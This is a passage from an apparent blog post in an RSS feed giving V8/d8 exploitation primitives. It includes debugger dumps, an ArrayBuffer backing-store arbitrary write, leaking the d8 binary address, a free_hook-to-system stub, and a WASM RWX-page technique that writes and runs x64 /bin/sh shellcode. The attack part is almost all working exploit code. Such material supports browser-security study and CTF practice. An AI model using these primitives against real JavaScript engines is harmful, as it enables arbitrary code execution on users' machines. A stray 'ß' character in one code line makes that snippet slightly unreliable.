0x2a46080c2b95: <span style="color:#f92672">[</span>JSArray<span style="color:#f92672">]</span>
 - map: 0x2a4608201869 &lt;Map<span style="color:#f92672">(</span>PACKED_SMI_ELEMENTS<span style="color:#f92672">)</span>&gt; <span style="color:#f92672">[</span>FastProperties<span style="color:#f92672">]</span>
 - prototype: 0x2a46081c8515 &lt;JSArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>&gt;
 - elements: 0x2a46081ce7bd &lt;FixedArray<span style="color:#f92672">[</span>3<span style="color:#f92672">]</span>&gt; <span style="color:#f92672">[</span>PACKED_SMI_ELEMENTS <span style="color:#f92672">(</span>COW<span style="color:#f92672">)]</span>
 - length: <span style="color:#ae81ff">3</span>
 - properties: 0x2a46080406e9 &lt;FixedArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>&gt; <span style="color:#f92672">{</span>
    0x2a4608042629: <span style="color:#f92672">[</span>String<span style="color:#f92672">]</span> in ReadOnlySpace: <span style="color:#75715e">#length: 0x2a4608140165 &lt;AccessorInfo&gt; (const accessor descriptor)</span>
 <span style="color:#f92672">}</span>
 - elements: 0x2a46081ce7bd &lt;FixedArray<span style="color:#f92672">[</span>3<span style="color:#f92672">]</span>&gt; <span style="color:#f92672">{</span>
           0: <span style="color:#ae81ff">1</span>
           1: <span style="color:#ae81ff">2</span>
           2: <span style="color:#ae81ff">3</span>
 <span style="color:#f92672">}</span>
</code></pre></div><h2 id="command-telescope">Command telescope</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; telescope 0x2a46080c2b95
00:0000│   0x2a46080c2b95 ◂— 0xbd080406e9082018
01:0008│   0x2a46080c2b9d ◂— 0x3d00000006081ce7
02:0010│   0x2a46080c2ba5 ◂— 0x9a0000000608040a
03:0018│   0x2a46080c2bad ◂— 0x9a3ff19999999999
04:0020│   0x2a46080c2bb5 ◂— 0x6640019999999999
05:0028│   0x2a46080c2bbd ◂— 0x9400a6666666666 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;fffff\n@\t&#39;</span><span style="color:#f92672">)</span>
06:0030│   0x2a46080c2bc5 ◂— 0xa5080406e9082019
07:0038│   0x2a46080c2bcd ◂— 0xb100000006080c2b
</code></pre></div><h2 id="debug">Debug</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%DebugPrint<span style="color:#f92672">(</span>a<span style="color:#f92672">)</span>;
%SystemBreak<span style="color:#f92672">()</span>;
</code></pre></div><h2 id="arbitrary-write">Arbitrary write</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">data_buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">8</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">data_view</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DataView</span>(<span style="color:#a6e22e">data_buf</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">buf_backing_store_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addressOf</span>(<span style="color:#a6e22e">data_buf</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span><span style="color:#a6e22e">n</span>;

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">write64_dataview</span>(<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">data</span>)
{
    <span style="color:#a6e22e">write64</span>(<span style="color:#a6e22e">buf_backing_store_addr</span>, <span style="color:#a6e22e">addr</span>);
    <span style="color:#a6e22e">data_view</span>.<span style="color:#a6e22e">setFloat64</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">i2f</span>(<span style="color:#a6e22e">data</span>), <span style="color:#66d9ef">true</span>);
    <span style="color:#75715e">//%SystemBreak();
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[+]write to : &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">addr</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">data</span>));
}
</code></pre></div><h2 id="get-the-address-in-d8">Get the address in d8</h2>
<p>Array obj -&gt; map -&gt; constructor -&gt; code -&gt; d8 addr</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">2.2</span>, <span style="color:#ae81ff">3.3</span>];
<span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(<span style="color:#a6e22e">a</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">code_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">addressOf</span>(<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">constructor</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x30</span><span style="color:#a6e22e">n</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">leak_d8_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">code_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x41</span><span style="color:#a6e22e">n</span>);<span style="color:#a6e22e">ß</span>
<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[*] find leak_d8_addr: 0x&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">leak_d8_addr</span>));
<span style="color:#f92672">%</span><span style="color:#a6e22e">SystemBreak</span>();
</code></pre></div><h2 id="edti-free_hook-to-system-and-getshell">Edti free_hook to system and getshell</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get_shell</span>()
{
    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">get_shell_buffer</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">0x1000</span>);
    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">get_shell_dataview</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DataView</span>(<span style="color:#a6e22e">get_shell_buffer</span>);
    <span style="color:#a6e22e">get_shell_dataview</span>.<span style="color:#a6e22e">setFloat64</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">i2f</span>(<span style="color:#ae81ff">0x0068732f6e69622f</span><span style="color:#a6e22e">n</span>)); <span style="color:#75715e">///bin/sh\x00 
</span><span style="color:#75715e"></span>}
</code></pre></div><h2 id="use-wasm-to-execute-shellcode">Use WASM to execute shellcode</h2>
<h3 id="init">Init</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasmCode</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>([<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">115</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">133</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">96</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">127</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">130</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">132</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">112</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">131</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">129</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">145</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">101</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">111</span>,<span style="color:#ae81ff">114</span>,<span style="color:#ae81ff">121</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">138</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">132</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">65</span>,<span style="color:#ae81ff">42</span>,<span style="color:#ae81ff">11</span>]);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasmModule</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebAssembly</span>.<span style="color:#a6e22e">Module</span>(<span style="color:#a6e22e">wasmCode</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasmInstance</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebAssembly</span>.<span style="color:#a6e22e">Instance</span>(<span style="color:#a6e22e">wasmModule</span>, {});
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">f</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">wasmInstance</span>.<span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">main</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">f_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addressOf</span>(<span style="color:#a6e22e">f</span>);
<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[*] leak wasm func addr: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">f_addr</span>));
<span style="color:#f92672">%</span><span style="color:#a6e22e">SystemBreak</span>();
</code></pre></div><h3 id="looking-for-rwx_page_addr">Looking for rwx_page_addr</h3>
<p>Function&ndash;&gt;shared_info&ndash;&gt;WasmExportedFunctionData&ndash;&gt;instance-&gt;instance+0x88</p>
<h4 id="without-compression-pointer">Without compression pointer</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#75715e">//function_addr-&gt;shared_info_addr-&gt;WasmExportedFunctionData-&gt;instance_addr-&gt;rwx_addr
</span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">shared_info_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">f_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span><span style="color:#a6e22e">n</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1</span><span style="color:#a6e22e">n</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasm_exported_func_data_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">shared_info_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span><span style="color:#a6e22e">n</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1</span><span style="color:#a6e22e">n</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasm_instance_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">wasm_exported_func_data_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span><span style="color:#a6e22e">n</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1</span><span style="color:#a6e22e">n</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">rwx_page_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">wasm_instance_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x88</span><span style="color:#a6e22e">n</span>);

<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[+]leak rwx_page_addr: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">rwx_page_addr</span>));
</code></pre></div><h4 id="with-compression-pointer">With compression pointer</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#75715e">//function_addr-&gt;shared_info_addr-&gt;WasmExportedFunctionData-&gt;instance_addr-&gt;rwx_addr
</span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">shared_info_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">leak32_l</span>(<span style="color:#a6e22e">f_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasm_exported_func_data_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">leak32_l</span>(<span style="color:#a6e22e">shared_info_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasm_instance_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">leak32_l</span>(<span style="color:#a6e22e">wasm_exported_func_data_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">rwx_page_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">leak64</span>(<span style="color:#a6e22e">wasm_instance_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x68</span>);

<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[+]leak rwx_page_addr: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">rwx_page_addr</span>));
</code></pre></div><h3 id="write-shellcode-and-execute-it">Write shellcode and execute it</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#75715e">/* /bin/sh for linux x64
</span><span style="color:#75715e"> char shellcode[] = &#34;\x6a\x3b\x58\x99\x52\x48\xbb\x2f \x2f\x62\x69\x6e\x2f\x73\x68\x53 \x54\x5f\x52\x57\x54\x5e\x0f\x05&#34;;
</span><span style="color:#75715e">*/</span>
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">shellcode</span> <span style="color:#f92672">=</span> [
    <span style="color:#ae81ff">0x2fbb485299583b6a</span><span style="color:#a6e22e">n</span>,
    <span style="color:#ae81ff">0x5368732f6e69622f</span><span style="color:#a6e22e">n</span>,
    <span style="color:#ae81ff">0x050f5e5457525f54</span><span style="color:#a6e22e">n</span>
];

<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">data_buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">24</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">data_view</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DataView</span>(<span style="color:#a6e22e">data_buf</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">buf_backing_store_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addressOf</span>(<span style="color:#a6e22e">data_buf</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span><span style="color:#a6e22e">n</span>;

<span style="color:#a6e22e">write64</span>(<span style="color:#a6e22e">buf_backing_store_addr</span>, <span style="color:#a6e22e">rwx_page_addr</span>); 
<span style="color:#a6e22e">data_view</span>.<span style="color:#a6e22e">setFloat64</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">i2f</span>(<span style="color:#a6e22e">shellcode</span>[<span style="color:#ae81ff">0</span>]), <span style="color:#66d9ef">true</span>);
<span style="color:#a6e22e">data_view</span>.<span style="color:#a6e22e">setFloat64</span>(<span style="color:#ae81ff">8</span>, <span style="color:#a6e22e">i2f</span>(<span style="color:#a6e22e">shellcode</span>[<span style="color:#ae81ff">1</span>]), <span style="color:#66d9ef">true</span>);
<span style="color:#a6e22e">data_view</span>.<span style="color:#a6e22e">setFloat64</span>(<span style="color:#ae81ff">16</span>, <span style="color:#a6e22e">i2f</span>(<span style="color:#a6e22e">shellcode</span>[<span style="color:#ae81ff">2</span>]), <span style="color:#66d9ef">true</span>);

<span style="color:#a6e22e">f</span>();
</code></pre></div>]]></content>
        </item>
        
    </channel>
</rss>
